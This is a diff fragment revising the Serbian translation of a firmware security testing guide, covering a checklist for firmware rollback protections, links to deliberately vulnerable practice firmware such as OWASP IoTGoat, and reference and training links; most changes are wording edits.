-* Da li uređaj upoređuje **brojeve verzije** ili **monotoni anti-rollback brojač** pre flešovanja?
-* Da li se image verifikuje unutar sigurnog boot lanca (npr. signatures proverene od strane ROM koda)?
-* Da li userland kod izvodi dodatne sanity provere (npr. dozvoljena mapa particija, broj modela)?
+* Da li su prenos i autentikacija *update endpoint*-a adekvatno zaštićeni (TLS + authentication)?
+* Da li uređaj upoređuje **brojeve verzija** ili **monotoni anti-rollback brojač** pre flashing-a?
+* Da li se image verifikuje unutar secure boot lanca (npr. potpisi provereni od strane ROM koda)?
+* Da li userland kod izvodi dodatne provere ispravnosti (npr. dozvoljena mapa particija, model uređaja)?
 * Da li *partial* ili *backup* update tokovi ponovo koriste istu validacionu logiku?
 
 > 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.
 
-## Ranljiv firmware za vežbu
+## Ranljivi firmware projekti za vežbanje
 
-Za vežbanje pronalaženja ranjivosti u firmware-u, koristite sledeće ranjive firmware projekte kao polaznu tačku.
+Za vežbu otkrivanja ranjivosti u firmware-u, koristite sledeće ranjive firmware projekte kao polaznu tačku.
 
 - OWASP IoTGoat
 - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
@@ -350,7 +353,7 @@ Za vežbanje pronalaženja ranjivosti u firmware-u, koristite sledeće ranjive f
 - Damn Vulnerable IoT Device (DVID)
 - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
 
-## References
+## Reference
 
 - [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
 - [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
@@ -359,7 +362,7 @@ Za vežbanje pronalaženja ranjivosti u firmware-u, koristite sledeće ranjive f
 
 - [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
 
-## Trening i sertifikati
+## Obuka i sertifikati
 
 - [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
 
